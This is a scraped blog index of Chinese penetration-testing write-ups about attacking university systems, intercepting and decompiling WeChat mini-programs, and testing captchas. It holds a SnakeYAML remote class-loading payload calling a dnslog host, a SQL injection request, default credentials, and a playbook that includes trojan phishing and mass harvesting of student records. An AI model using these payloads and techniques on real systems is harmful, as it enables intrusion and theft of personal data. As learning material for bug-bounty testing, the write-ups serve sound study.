","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:4","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#文件上传-xss"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/2423 1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息… ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:0:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#"},{"categories":["学习"],"content":" 1、OA系统密码找回","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:1:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#1oa系统密码找回"},{"categories":["学习"],"content":" 找回密码系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息中心的身份登录OA系统 在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位 成功登录一部分账号 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:2:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#找回密码"},{"categories":["学习"],"content":" 登录VPN进行内网扫描，利用MS17010拿下C段多台主机权限 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:3:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#登录vpn"},{"categories":["学习"],"content":" 钓鱼利用OA系统的通讯功能，散播木马 获取多台机器权限 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:4:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#钓鱼"},{"categories":["学习"],"content":" 2、逻辑漏洞修改密码","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:5:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#2逻辑漏洞修改密码"},{"categories":["学习"],"content":" GitHub密码泄漏GitHub泄漏学号密码 但账号已被禁用 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:6:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#github密码泄漏"},{"categories":["学习"],"content":" 获取学号手机号存在注册功能的网站注册用户，然后登录 通过以下接口获得用户ID /User/GetUserListByKeyWord 可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息 /User/Tip?time61\u0026id=caec35e7-9956-4f68-98bc-e2aee73ebda5\u0026_=1664438691592 获取多组学号、姓名、手机号 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:7:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#获取学号手机号"},{"categories":["学习"],"content":" 修改密码点击同意门户的忘记密码功能，输入上面得到的学号 输入手机号，点击获取验证码并抓包 记录回包内容 \"datas\":\"{\\\"sign\\\":\\\"407ec6dc275f4766a4525e059a60ca16\\\"}\",\"code\":\"0\",\"message\":\"获取成功\" 随意输入验证码，点击下一步，并把上面的流量包直接返回 可以看到页面跳转到了设置密码 成功更改密码 79个应用，通过其中一个aspx站SQL注入拿到shell ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:8:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#修改密码"},{"categories":["学习"],"content":" 3、Github泄漏账号密码","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:9:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#3github泄漏账号密码"},{"categories":["学习"],"content":" 账号密码1、GitHub搜索\"学校域名\" “password” 发现邮箱账号密码 2、登录邮箱发现手机号身份证号 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:10:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#账号密码"},{"categories":["学习"],"content":" 统一门户3、手机号加邮箱密码直接登录统一门户 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:11:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#统一门户"},{"categories":["学习"],"content":" 泛微OA跳转到泛微OA,文件上传GetShell ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:12:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#泛微oa"},{"categories":["学习"],"content":" 4、向日葵密码读取","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:13:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#4向日葵密码读取"},{"categories":["学习"],"content":" heapdump文件泄漏直接下载heapdump文件 读取到mssql账号密码 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:14:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#heapdump文件泄漏"},{"categories":["学习"],"content":" 向日葵密码读取成功连接mssql服务器，执行xp_cmdshell C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini为向日葵的默认安装配置文件，直接尝试读取 fastcode将第一位字母去除就为本机识别码，encry_pwd为加密后的本机验证码 可以使用GitHub解密项目https://github.com/wafinfo/Sunflower_get_Password进行解密。 解密后成功连接目标主机服务器 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:15:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#向日葵密码读取"},{"categories":["学习"],"content":" 5、若依漏洞GetShell1、某学院首页 2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:16:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#5若依漏洞getshell"},{"categories":["学习"],"content":" 定时任务命令执行以管理员权限登录在定时任务处新增 org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [“ftp://ceshi.bdtmos.dnslog.cn”] ]] ]’)运行任务 DNSlog平台收到请求 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:17:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#定时任务命令执行"},{"categories":["学习"],"content":" shiro 反序列化漏洞工具直接开扫，成功注入内存马 连接内存马 发现历史入侵痕迹，发现fscan黑客漏扫工具 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:18:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#shiro-反序列化漏洞"},{"categories":["学习"],"content":" SQL注入sql注入当时也懒得去尝试，估计也是存在的 /system/role/list /system/role/export /system/dept/edit POST /system/role/list HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e9f143b9-3c3d-4acb-96a4-93c7367a98e9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 75 params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e)) ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:19:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#sql注入"},{"categories":["学习"],"content":" 6、FCKeditor上传文件GetShell1、扫描目录发现存在FCKeditor目录 2、直接找到上传目录 3、上传aspx木马 成功连接 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:20:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#6fckeditor上传文件getshell"},{"categories":["学习"],"content":" 7、任意文件上传根据学校名称及域名进行编排密码本，爆破登录admin账号 上传点任意文件上传GetShell ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:21:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#7任意文件上传"},{"categories":["学习"],"content":" 8、S2反序列化漏洞GetShell1、目标网站存在S2框架 2、直接使用工具进行扫描，进而获取权限进行内网渗透 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:22:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#8s2反序列化漏洞getshell"},{"categories":["学习"],"content":" 9、逻辑漏洞","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:23:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#9逻辑漏洞"},{"categories":["学习"],"content":" 找回密码1、某站点找回密码处，短信验证码直接出现在回包中 2、谷歌语法搜索 “XX大学” “手机号” filetype:xls 找到一些手机号码 3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统 但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:24:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#找回密码-1"},{"categories":["学习"],"content":" 统一门户使用学号加身份证后六位直接登录统一服务平台 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:25:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#统一门户-1"},{"categories":["学习"],"content":" 10、geoserver弱口令8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:26:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#10geoserver弱口令"},{"categories":["学习"],"content":" 获取数据库密码登录后进入配置页面，点击查看其中的数据存储 F12查看网页源代码，读取PostgreSQL密码： ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:27:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#获取数据库密码"},{"categories":["学习"],"content":" 撞库同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。 在其中一个log表中发现了账号和MD5加密的密码。 ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:28:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#撞库"},{"categories":["学习"],"content":" GetShell8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了） ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:29:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#getshell"},{"categories":["学习"],"content":" 总结：对于高校的渗透可以从以下几点入手 1、VPN弱口令，GitHub泄漏是重灾区，可以搜索\"学校域名\" “password” 2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。 3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。 4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排 5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中 总结起来就是多信息收集，信息收集yyds ","date":"2024-07-28","objectID":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/:30:0","series":null,"tags":["信息收集","SRC"],"title":"教育行业渗透打点","uri":"/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/#总结"},{"categories":["技术"],"content":" 转载自： https://forum.butian.net/share/2477 网上大多数的小程序测试抓包都是用的安卓模拟器，这里使用的是BurpSuite+Proxifer+微信客户端的抓包方式 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:0:0","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#"},{"categories":["技术"],"content":" 环境准备Burp2023.9.2 Proxifier4.5 安装就无脑next就好了，安装好后打开 点击注册，名字随便写，随便复制一个注册码点击ok即可 Proxifier配置 打开proxifier，点击profile添加一个代理服务器 地址127.0.0.1，端口自定义，我这里是8888，协议选择https 继续添加一条代理规则 在我们用微信打开小程序时，进程里会多出一个WeChatAppEx 这个程序就是微信小程序的进程 添加规则 Applications就选择小程序进程应用（这里可以手动输入），Action就选择刚刚新建的代理服务器 Burp配置 只要编辑代理监听器和proxifier里的代理服务器一样即可，监听127.0.0.1:8888 这时微信打开一个小程序，可以看到WeChatAppEx的流量先经过proxifier，再用过127.0.0.1:8888到burp 现在就可以像平时测试web站点一样的方式在burp里对数据包进行测试 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:1:0","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#环境准备"},{"categories":["技术"],"content":" 小程序反编译 在微信的设置里面可以找到微信文件保存的位置 目录下的Applet就是小程序缓存文件的保存地址 平时使用的小程序越多，对应的文件也就越多，如果找不到自己想要测试的小程序包，可以根据修改日期来找，或者直接简单粗暴，删除所有的缓存文件，再重新打开你想要测试的小程序 这时里面的就是我们要测试小程序对应的缓存文件夹 点开里面就是我们要解的包 这是一个加密的包，当用户在微信中搜索或扫描小程序二维码后，微信后台会将该小程序的相关信息打包成 .wxapkg 文件并下发到用户的设备中，这种文件格式实际上是一个压缩包，其中包含了小程序的所有代码、资源和配置文件等内容，以及一个特定的描述文件 app.json。 由于是加密的包，所以先来解密，下面是大佬的解密工具链接 链接：https://pan.baidu.com/s/1BzfvBVwD4vLpakX9PAyrsg?pwd=qz3z 提取码：qz3z 选中加密的包 解密成功后在工具目录的wxpack目录下 接下来进行反编译 首先安装nodejs，下载链接https://nodejs.org/zh-cn/download/ ，安装就一直下一步就好了，安装好之后添加环境变量 加好环境变量后cmd输入命令会得到回显 接下来使用反编译工具wxappUnpacker 原链接https://github.com/system-cpu/wxappUnpacker 网盘链接：https://pan.baidu.com/s/19O2KDqWn2Zyars8AREJ1LQ?pwd=22qj 提取码：22qj 来到工具目录 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:2:0","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#小程序反编译"},{"categories":["技术"],"content":" 安装 安装依赖 npm install esprima npm install css-tree npm install cssbeautify npm install vm2 npm install uglify-es npm install js-beautify 逐条执行以上命令 接下来反编译 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:2:1","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#安装"},{"categories":["技术"],"content":" 执行命令node wuWxapkg.js 解密后小程序的路径 执行完后会在被反编译的包的目录下生成一个目录 里面就是反编译过后得到的文件了 下载微信开发者工具 官网下载链接 https://servicewechat.com/wxa-dev-logic/download_redirect?type=win32_x64\u0026from=mpwiki\u0026download_version=1062308310\u0026version_type=1 安装好后打开 点击加号 目录选择反编译后的目录，后端服务选择不使用云服务，点击确定 就可以查看小程序的js代码了 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:2:2","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#执行命令"},{"categories":["技术"],"content":" 测试点击发送验证码的功能 是/api/shop/ipad/login/sms路径 在代码里面找到发送功能的代码 发现只有/login/sms 现在基本确认了路径访问规则，将接口拼接到/api/shop/ipad之后，找其他接口拼接尝试有没有未授权 找一个首页的路径拼接 直接发包返回404 拼接/api/shop/ipad之后发包 可以确定路径是对了，但是不存在未授权，这一个路径不存在，并不完全代表所有接口都不存在，也许有那么几个接口漏掉了没做鉴权，就会造成未授权，信息泄露之类的 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:2:3","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#测试"},{"categories":["技术"],"content":" 一不小心getshell继续看刚刚发送验证码的接口，看看有没有短信轰炸之类的 访问/login/sms接口，并且以post方式接收mobile参数 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:3:0","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#一不小心getshell"},{"categories":["技术"],"content":" 构造包 输入一个不存在的手机号，显示手机号码有误 输入一个真实的也提示有误，有可能只有系统存在的账户手机号才有效 看到参数习惯性打个单引号 哦豁，再加个单引号 哦豁+1 看返回数据包可以判断出用的.net，个人觉得这个框架是很多注入的，尝试手注没有回显，sqlmap一把梭，https加上–force-ssl参数 成功跑出SQL注入，而且是堆叠注入，尝试–os-shell 直接下班 ","date":"2024-06-14","objectID":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/:3:1","series":null,"tags":["微信小程序","抓包"],"title":"微信小程序抓包及测试","uri":"/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/#构造包"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/2602 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#"},{"categories":["学习"],"content":" 验证码渗透最全总结不少人在碰见验证码的时候，大多数只是看了一眼就过去了，没想到验证码还有啥可测试的。但其实验证码也能在项目中导致高危,并且验证码漏洞能在一定情况下造成危害。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:1:0","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#验证码渗透最全总结"},{"categories":["学习"],"content":" 验证码总结验证码分为两块内容，一块是图形验证码，一块是短信验证码。下面是对这些技巧总结的思维导图。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:0","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#验证码总结"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 